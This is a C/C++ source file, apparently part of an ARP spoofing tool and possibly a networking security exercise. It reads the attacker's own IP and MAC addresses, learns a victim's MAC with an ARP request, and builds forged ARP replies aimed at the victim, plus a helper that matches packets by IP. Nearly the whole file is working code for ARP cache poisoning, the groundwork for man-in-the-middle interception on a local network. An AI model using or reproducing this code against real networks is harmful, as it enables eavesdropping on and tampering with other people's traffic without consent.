#include "arp-spoof.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void get_attacker_ip(char* ipaddr,  char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	struct sockaddr_in* sin;

    if (sock < 0) {
        fprintf(stderr, "Socket() error!\n");
        return;
    }

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(sock, SIOCGIFADDR, &ifr);

	sin = (struct sockaddr_in*)&ifr.ifr_addr;

    strcpy(ipaddr, inet_ntoa(sin->sin_addr));
    
	close(sock);
}

void get_attacker_mac(char* macaddr, char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;

    if (sock < 0) {
        fprintf(stderr, "Socket() error!\n");
        return;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    for (int i = 0; i < 6; i++)
        sprintf(&macaddr[i*3],"%02x:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    macaddr[17]='\0';
    close(sock);   
}

void get_host_mac(char* senderip, char* sendermac, char* attip, char* attmac, pcap_t* handle) {
    EthArpPacket sendpkt;

    // Set the request header.
    sendpkt.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	sendpkt.eth_.smac_ = Mac(attmac);
	sendpkt.eth_.type_ = htons(EthHdr::Arp);

	sendpkt.arp_.hrd_ = htons(ArpHdr::ETHER);
	sendpkt.arp_.pro_ = htons(EthHdr::Ip4);
	sendpkt.arp_.hln_ = Mac::SIZE;
	sendpkt.arp_.pln_ = Ip::SIZE;
	sendpkt.arp_.op_ = htons(ArpHdr::Request);
	sendpkt.arp_.smac_ = Mac(attmac);
	sendpkt.arp_.sip_ = htonl(Ip(attip));
	sendpkt.arp_.tmac_ = Mac("00:00:00:00:00:00");
	sendpkt.arp_.tip_ = htonl(Ip(senderip));

    // Send ARP packet to sender to get sender's MAC address.
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendpkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "Send ARP packet error!\n");
	}

    // Get reply ARP packet.
    while(1) {
        struct pcap_pkthdr* header;
        const u_char* rcv_packet;
        int res = pcap_next_ex(handle, &header, &rcv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return error! %d(%s).\n", res, pcap_geterr(handle));
            break;
        }
        else {
            if(((uint8_t)rcv_packet[12] == 0x08) && ((uint8_t)rcv_packet[13] == 0x06) && ((uint8_t)rcv_packet[21] == 0x02)){ // type : ARP
                for (int i = 0; i < 6; i++)
                    sprintf(&sendermac[i*3],"%02x:",((unsigned char*)rcv_packet)[6+i]);
                sendermac[17]='\0';
                break;
			} 
		}        
    }
}

void send_arp_pkt(char* destip, char* destmac, char* srcip, char* srcmac, pcap_t* handle, int opcode)
{
    EthArpPacket sendpkt;
    // Set the request header.
    sendpkt.eth_.dmac_ = Mac(destmac);
	sendpkt.eth_.smac_ = Mac(srcmac);
	sendpkt.eth_.type_ = htons(EthHdr::Arp);

	sendpkt.arp_.hrd_ = htons(ArpHdr::ETHER);
	sendpkt.arp_.pro_ = htons(EthHdr::Ip4);
	sendpkt.arp_.hln_ = Mac::SIZE;
	sendpkt.arp_.pln_ = Ip::SIZE;
	if (opcode == 1) sendpkt.arp_.op_ = htons(ArpHdr::Request);
    else if (opcode == 2) sendpkt.arp_.op_ = htons(ArpHdr::Reply);
	sendpkt.arp_.smac_ = Mac(srcmac);
	sendpkt.arp_.sip_ = htonl(Ip(srcip));
	sendpkt.arp_.tmac_ = Mac(destmac);
	sendpkt.arp_.tip_ = htonl(Ip(destip));

    // Send despiteful ARP reply packet to victim.
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendpkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "Send ARP packet error!\n");
	}
}

bool check_packet(char* ip, uint8_t* new_ip) {
    bool checkflag = true;
    uint8_t conv_ip[4];
    int tmp[4];
    int i;

    sscanf(ip, "%u.%u.%u.%u", &tmp[0], &tmp[1], &tmp[2], &tmp[3]);
    for(i = 0; i < 4; i++) conv_ip[i] = (uint8_t)tmp[i];

    for(i = 0; i < 4; i++) {
        if (conv_ip[i] != new_ip[i]) {
            checkflag = false;
            break;
        }
    }
    return checkflag;
}